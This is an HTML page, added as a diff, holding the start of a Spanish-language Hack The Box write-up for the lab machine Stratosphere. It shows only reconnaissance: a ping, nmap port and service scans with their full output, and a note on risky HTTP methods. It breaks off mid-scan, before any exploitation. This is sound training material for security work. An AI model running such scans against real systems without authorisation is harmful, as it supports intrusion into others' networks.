@@ -1,0 +1,1161 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box Stratosphere - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina Stratosphere en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box Stratosphere">
+<meta property="og:url" content="http://localhost:4000/htb-stratosphere/">
+
+
+  <meta property="og:description" content="Resolución de la máquina Stratosphere en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-stratosphere/stratosphere.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-10-12T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-stratosphere/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Artículos</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categorías</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Etiquetas</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/buscador/">Buscador</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">Contacto</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box Stratosphere</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Intelligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box Stratosphere">
+    <meta itemprop="description" content="Resolución de la máquina Stratosphere en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="October 12, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Stratosphere
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-10-12T00:00:00-05:00">October 12, 2021 </time> 
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-stratosphere/banner-stratosphere.jpg" alt=""></p>
+
+<h2 id="stratosphere">Stratosphere</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.64.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.64
+PING 10.10.10.64 <span class="o">(</span>10.10.10.64<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.64: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>184 ms
+
+<span class="nt">---</span> 10.10.10.64 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 184.278/184.278/184.278/0.000 ms
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.64 <span class="nt">-oG</span> allPorts
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-12 15:02 CDT
+Initiating SYN Stealth Scan at 15:02
+Scanning 10.10.10.64 <span class="o">[</span>65535 ports]
+Discovered open port 80/tcp on 10.10.10.64
+Discovered open port 22/tcp on 10.10.10.64
+Discovered open port 8080/tcp on 10.10.10.64
+Stats: 0:00:24 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 62.64% <span class="k">done</span><span class="p">;</span> ETC: 15:02 <span class="o">(</span>0:00:14 remaining<span class="o">)</span>
+Completed SYN Stealth Scan at 15:03, 39.59s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.64
+Host is up, received user-set <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2021-10-12 15:02:21 CDT <span class="k">for </span>39s
+Not shown: 65532 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT     STATE SERVICE    REASON
+22/tcp   open  ssh        syn-ack ttl 63
+80/tcp   open  http       syn-ack ttl 63
+8080/tcp open  http-proxy syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>39.69 seconds
+           Raw packets sent: 196627 <span class="o">(</span>8.652MB<span class="o">)</span> | Rcvd: 31 <span class="o">(</span>1.364KB<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.64
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 22,80,8080
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p22</span>,80,8080 10.10.10.64 <span class="nt">-oN</span> targeted                                                                             
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-12 15:05 CDT                                                                  
+Nmap scan report <span class="k">for </span>10.10.10.64                                                                                                 
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>                                                                                                      
+                                                                                                                                 
+PORT     STATE SERVICE    VERSION                                                                                                
+22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>                                                          
+| ssh-hostkey:                                                                                                                   
+|   2048 5b:16:37:d4:3c:18:04:15:c4:02:01:0d:db:07:ac:2d <span class="o">(</span>RSA<span class="o">)</span>                                                                   
+|   256 e3:77:7b:2c:23:b0:8d:df:38:35:6c:40:ab:f6:81:50 <span class="o">(</span>ECDSA<span class="o">)</span>                                                                  
+|_  256 d7:6b:66:9c:19:fc:aa:66:6c:18:7a:cc:b5:87:0e:40 <span class="o">(</span>ED25519<span class="o">)</span>                                                                
+80/tcp   open  http                                                                                                              
+|_http-title: Stratosphere                                                                                                       
+| fingerprint-strings:                                                                                                           
+|   FourOhFourRequest:                                                                                                           
+|     HTTP/1.1 404                                                                                                               
+|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8                                                                                      
+|     Content-Language: en                                                                                                       
+|     Content-Length: 1114                                                                                                       
+|     Date: Tue, 12 Oct 2021 20:10:28 GMT                                                                                        
+|     Connection: close                                                                                                          
+|     &lt;<span class="o">!</span>doctype html&gt;&lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;HTTP Status 404                                                                
+|     Found&lt;/title&gt;&lt;style <span class="nb">type</span><span class="o">=</span><span class="s2">"text/css"</span><span class="o">&gt;</span>h1 <span class="o">{</span>font-family:Tahoma,Arial,sans-serif<span class="p">;</span>color:white<span class="p">;</span>background-color:#525D76<span class="p">;</span>font-size:
+22px<span class="p">;</span><span class="o">}</span> h2 <span class="o">{</span>font-family:Tahoma,Arial,sans-serif<span class="p">;</span>color:white<span class="p">;</span>background-color:#525D76<span class="p">;</span>font-size:16px<span class="p">;</span><span class="o">}</span> h3 <span class="o">{</span>font-family:Tahoma,Arial
+,sans-serif<span class="p">;</span>color:white<span class="p">;</span>background-color:#525D76<span class="p">;</span>font-size:14px<span class="p">;</span><span class="o">}</span> body <span class="o">{</span>font-family:Tahoma,Arial,sans-serif<span class="p">;</span>color:black<span class="p">;</span>backgroun
+d-color:white<span class="p">;</span><span class="o">}</span> b <span class="o">{</span>font-family:Tahoma,Arial,sans-serif<span class="p">;</span>color:white<span class="p">;</span>background-color:#525D76<span class="p">;</span><span class="o">}</span> p <span class="o">{</span>font-family:Tahoma,Arial,sans-se
+rif<span class="p">;</span>background:white<span class="p">;</span>color:black<span class="p">;</span>font-size:12px<span class="p">;</span><span class="o">}</span> a <span class="o">{</span>color:black<span class="p">;</span><span class="o">}</span> a.name <span class="o">{</span>color:black<span class="p">;</span><span class="o">}</span> .line <span class="o">{</span>height:1px<span class="p">;</span>background-color:#525D
+76<span class="p">;</span>border:none<span class="p">;</span><span class="o">}</span>&lt;/style&gt;&lt;/head&gt;&lt;body&gt;
+|   GetRequest:                                                                                                                  
+|     HTTP/1.1 200                                                                                                               
+|     Accept-Ranges: bytes                                                                                                       
+|     ETag: W/<span class="s2">"1708-1519762495000"</span>                                                                                               
+|     Last-Modified: Tue, 27 Feb 2018 20:14:55 GMT                                                                               
+|     Content-Type: text/html                                                                                                    
+|     Content-Length: 1708                                                                                                       
+|     Date: Tue, 12 Oct 2021 20:10:27 GMT                                                                                        
+|     Connection: close                                                                                                          
+|     &lt;<span class="o">!</span>DOCTYPE html&gt;                                                                                                            
+|     &lt;html&gt;                                                                                                                     
+|     &lt;<span class="nb">head</span><span class="o">&gt;</span>                                                                                                                     
+|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span>/&gt;                                                                                                    
+|     &lt;title&gt;Stratosphere&lt;/title&gt;                                                                                                
+|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"text/css"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"main.css"</span><span class="o">&gt;</span>                                                                    
+|     &lt;/head&gt;                                                                                                                    
+|     &lt;body&gt;                                                                                                                     
+|     &lt;div <span class="nb">id</span><span class="o">=</span><span class="s2">"background"</span><span class="o">&gt;</span>&lt;/div&gt;                                                                                                
+|     &lt;header <span class="nb">id</span><span class="o">=</span><span class="s2">"main-header"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"hidden"</span><span class="o">&gt;</span>                                                                                   
+|     &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"container"</span><span class="o">&gt;</span>                                                                                                    
+|     &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"content-wrap"</span><span class="o">&gt;</span>                                                                                                 
+|     &lt;p&gt;&lt;i <span class="nv">class</span><span class="o">=</span><span class="s2">"fa fa-diamond"</span><span class="o">&gt;</span>&lt;/i&gt;&lt;/p&gt;                                                                                       
+|     &lt;nav&gt;
+|     <span class="nv">class</span><span class="o">=</span><span class="s2">"btn"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"GettingStarted.html"</span><span class="o">&gt;</span>Get started&lt;/a&gt;
+|     &lt;/nav&gt;
+|     &lt;/div&gt;
+|     &lt;/div&gt;
+|     &lt;/header&gt;
+|     &lt;section <span class="nb">id</span><span class="o">=</span><span class="s2">"greeting"</span><span class="o">&gt;</span>
+|     &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"container"</span><span class="o">&gt;</span>
+|     &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"content-wrap"</span><span class="o">&gt;</span> 
+|     &lt;h1&gt;Stratosphere&lt;br&gt;We protect your credit.&lt;/h1&gt;
+|     <span class="nv">class</span><span class="o">=</span><span class="s2">"btn"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"GettingStarted.html"</span><span class="o">&gt;</span>Get started now&lt;/a&gt; 
+|     &lt;p&gt;&lt;i <span class="nv">class</span><span class="o">=</span><span class="s2">"ar
+|   HTTPOptions: 
+|     HTTP/1.1 200 
+|     Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
+|     Content-Length: 0
+|     Date: Tue, 12 Oct 2021 20:10:27 GMT
+|     Connection: close
+|   RTSPRequest, X11Probe: 
+|     HTTP/1.1 400 
+|     Date: Tue, 12 Oct 2021 20:10:27 GMT
+|_    Connection: close
+| http-methods: 
+|_  Potentially risky methods: PUT DELETE
+8080/tcp open  http-proxy
+| http-methods: 
+|_  Potentially risky methods: PUT DELETE
+|_http-title: Stratosphere
+|_http-open-proxy: Proxy might be redirecting requests
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 1114
+|     Date: Tue, 12 Oct 2021 20:10:27 GMT
+|     Connection: close
+|     &lt;!doctype html&gt;&lt;html lang="</span>en<span class="s2">"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 404 
+|     Found&lt;/title&gt;&lt;style type="</span>text/css<span class="s2">"&gt;h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:
+22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial
+,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;backgroun
+d-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-se
+rif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D
+76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;
+|   GetRequest: 
+|     HTTP/1.1 200 
+|     Accept-Ranges: bytes
+|     ETag: W/"</span>1708-1519762495000<span class="s2">"
+|     Last-Modified: Tue, 27 Feb 2018 20:14:55 GMT
+|     Content-Type: text/html
+|     Content-Length: 1708
+|     Date: Tue, 12 Oct 2021 20:10:27 GMT
+|     Connection: close
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;meta charset="</span>utf-8<span class="s2">"/&gt;
+|     &lt;title&gt;Stratosphere&lt;/title&gt;
+|     &lt;link rel="</span>stylesheet<span class="s2">" type="</span>text/css<span class="s2">" href="</span>main.css<span class="s2">"&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;div id="</span>background<span class="s2">"&gt;&lt;/div&gt;
+|     &lt;header id="</span>main-header<span class="s2">" class="</span>hidden<span class="s2">"&gt;
+|     &lt;div class="</span>container<span class="s2">"&gt;
+|     &lt;div class="</span>content-wrap<span class="s2">"&gt; 
+|     &lt;p&gt;&lt;i class="</span>fa fa-diamond<span class="s2">"&gt;&lt;/i&gt;&lt;/p&gt;
+|     &lt;nav&gt;
+|     class="</span>btn<span class="s2">" href="</span>GettingStarted.html<span class="s2">"&gt;Get started&lt;/a&gt;
+|     &lt;/nav&gt;
+|     &lt;/div&gt;
+|     &lt;/div&gt;
+|     &lt;/header&gt;
+|     &lt;section id="</span>greeting<span class="s2">"&gt;
+|     &lt;div class="</span>container<span class="s2">"&gt;
+|     &lt;div class="</span>content-wrap<span class="s2">"&gt; 
+|     &lt;h1&gt;Stratosphere&lt;br&gt;We protect your credit.&lt;/h1&gt;
+|     class="</span>btn<span class="s2">" href="</span>GettingStarted.html<span class="s2">"&gt;Get started now&lt;/a&gt; 
+|     &lt;p&gt;&lt;i class="</span>ar
+|   HTTPOptions: 
+|     HTTP/1.1 200 
+|     Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
+|     Content-Length: 0
+|     Date: Tue, 12 Oct 2021 20:10:27 GMT
+|     Connection: close
+|   RTSPRequest: 
+|     HTTP/1.1 400 
+|     Date: Tue, 12 Oct 2021 20:10:27 GMT
+|_    Connection: close
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at http
+s://nmap.org/cgi-bin/submit.cgi?new-service :
+<span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
+SF-Port80-TCP:V<span class="o">=</span>7.92%I<span class="o">=</span>7%D<span class="o">=</span>10/12%Time<span class="o">=</span>6165EA91%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>Get
+SF:Request,786,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20200</span><span class="se">\x</span><span class="s2">20</span><span class="se">\r\n</span><span class="s2">Accept-Ranges:</span><span class="se">\x</span><span class="s2">20bytes</span><span class="se">\r\n</span><span class="s2">ETag:</span><span class="se">\x</span><span class="s2">
+SF:20W/</span><span class="se">\"</span><span class="s2">1708-1519762495000</span><span class="se">\"\r\n</span><span class="s2">Last-Modified:</span><span class="se">\x</span><span class="s2">20Tue,</span><span class="se">\x</span><span class="s2">2027</span><span class="se">\x</span><span class="s2">20Feb</span><span class="se">\x</span><span class="s2">2020
+SF:18</span><span class="se">\x</span><span class="s2">2020:14:55</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/html</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\</span><span class="s2">
+SF:x201708</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Tue,</span><span class="se">\x</span><span class="s2">2012</span><span class="se">\x</span><span class="s2">20Oct</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2020:10:27</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Con
+SF:nection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n\r\n</span><span class="s2">&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20html&gt;</span><span class="se">\n</span><span class="s2">&lt;html&gt;</span><span class="se">\n</span><span class="s2">&lt;head&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">
+SF:20</span><span class="se">\x</span><span class="s2">20&lt;meta</span><span class="se">\x</span><span class="s2">20charset=</span><span class="se">\"</span><span class="s2">utf-8</span><span class="se">\"</span><span class="s2">/&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;title&gt;Stratosphere
+SF:&lt;/title&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20type=</span><span class="se">\"</span><span class="s2">text/cs
+SF:s</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">main</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;/head&gt;</span><span class="se">\n\n</span><span class="s2">&lt;body&gt;</span><span class="se">\n</span><span class="s2">&lt;div</span><span class="se">\x</span><span class="s2">20id=</span><span class="se">\"</span><span class="s2">background</span><span class="se">\</span><span class="s2">
+SF:"</span><span class="o">&gt;</span>&lt;/div&gt;<span class="se">\n</span>&lt;header<span class="se">\x</span><span class="nv">20id</span><span class="o">=</span><span class="se">\"</span>main-header<span class="se">\"\x</span><span class="nv">20class</span><span class="o">=</span><span class="se">\"</span>hidden<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n\x</span>20<span class="se">\x</span>20&lt;
+SF:div<span class="se">\x</span><span class="nv">20class</span><span class="o">=</span><span class="se">\"</span>container<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;div<span class="se">\x</span><span class="nv">20class</span><span class="o">=</span><span class="se">\"</span>content-wr
+SF:ap<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;p&gt;&lt;i<span class="se">\x</span><span class="nv">20class</span><span class="o">=</span><span class="se">\"</span>fa<span class="se">\x</span>20fa-diamond<span class="se">\"</span><span class="o">&gt;</span>&lt;/i&gt;
+SF:&lt;/p&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;nav&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;a
+SF:<span class="se">\x</span><span class="nv">20class</span><span class="o">=</span><span class="se">\"</span>btn<span class="se">\"\x</span><span class="nv">20href</span><span class="o">=</span><span class="se">\"</span>GettingStarted<span class="se">\.</span>html<span class="se">\"</span><span class="o">&gt;</span>Get<span class="se">\x</span>20started&lt;/a&gt;<span class="se">\n</span>
+SF:<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;/nav&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;/div&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20&lt;/div&gt;<span class="se">\</span>
+SF:n&lt;/header&gt;<span class="se">\n\n</span>&lt;section<span class="se">\x</span><span class="nv">20id</span><span class="o">=</span><span class="se">\"</span>greeting<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n\x</span>20<span class="se">\x</span>20&lt;div<span class="se">\x</span><span class="nv">20class</span><span class="o">=</span><span class="se">\"</span>con
+SF:tainer<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;div<span class="se">\x</span><span class="nv">20class</span><span class="o">=</span><span class="se">\"</span>content-wrap<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>2
+SF:0<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;h1&gt;Stratosphere&lt;br&gt;We<span class="se">\x</span>20protect<span class="se">\x</span>20your<span class="se">\x</span>20credit<span class="se">\.</span>&lt;/h1&gt;
+SF:<span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;a<span class="se">\x</span><span class="nv">20class</span><span class="o">=</span><span class="se">\"</span>btn<span class="se">\"\x</span><span class="nv">20href</span><span class="o">=</span><span class="se">\"</span>GettingStarted<span class="se">\</span>
+SF:.html<span class="se">\"</span><span class="o">&gt;</span>Get<span class="se">\x</span>20started<span class="se">\x</span>20now&lt;/a&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;p&gt;&lt;i<span class="se">\x</span>20cla
+SF:ss<span class="o">=</span><span class="se">\"</span>ar<span class="s2">")%r(HTTPOptions,8A,"</span>HTTP/1<span class="se">\.</span>1<span class="se">\x</span>20200<span class="se">\x</span>20<span class="se">\r\n</span>Allow:<span class="se">\x</span>20GET,<span class="se">\x</span>20H
+SF:EAD,<span class="se">\x</span>20POST,<span class="se">\x</span>20PUT,<span class="se">\x</span>20DELETE,<span class="se">\x</span>20OPTIONS<span class="se">\r\n</span>Content-Length:<span class="se">\x</span>200<span class="se">\r\n</span>
+SF:Date:<span class="se">\x</span>20Tue,<span class="se">\x</span>2012<span class="se">\x</span>20Oct<span class="se">\x</span>202021<span class="se">\x</span>2020:10:27<span class="se">\x</span>20GMT<span class="se">\r\n</span>Connection:<span class="se">\x</span>2
+SF:0close<span class="se">\r\n\r\n</span><span class="s2">")%r(RTSPRequest,49,"</span>HTTP/1<span class="se">\.</span>1<span class="se">\x</span>20400<span class="se">\x</span>20<span class="se">\r\n</span>Date:<span class="se">\x</span>20Tue
+SF:,<span class="se">\x</span>2012<span class="se">\x</span>20Oct<span class="se">\x</span>202021<span class="se">\x</span>2020:10:27<span class="se">\x</span>20GMT<span class="se">\r\n</span>Connection:<span class="se">\x</span>20close<span class="se">\r\n\r</span>
